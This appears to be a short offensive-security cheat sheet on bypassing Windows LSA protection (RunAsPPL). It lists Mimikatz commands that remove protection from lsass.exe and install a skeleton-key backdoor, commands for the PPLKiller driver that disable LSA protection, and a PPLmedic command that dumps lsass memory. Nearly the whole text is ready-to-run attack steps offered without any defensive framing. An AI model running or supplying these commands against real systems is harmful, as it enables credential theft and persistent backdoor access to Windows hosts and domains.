# RunAsPPL Bypass

### 1) Check if RunAsPPL is enabled in the registry.

    HKLM\SYSTEM\CurrentControlSet\Control\Lsa

### 2) Mimikatz

    mimikatz # privilege::debug
    mimikatz # !+
    mimikatz # !processprotect /process:lsass.exe /remove
    mimikatz # misc::skeleton
    mimikatz # !-

### If Mimikatz can't be used, PPLKiller is an alternative 

Link: https://github.com/RedCursorSecurityConsulting/PPLKiller

    ./PPLKiller.exe /installDriver
    ./PPLKiller.exe /disableLSAProtection
    ./PPLKiller.exe /uninstallDriver

OR PPLMedic

Link: https://github.com/itm4n/PPLmedic

    ./PPLmedic.exe dump <lsass_PID> <C:\path\to\dump.dmp>

 
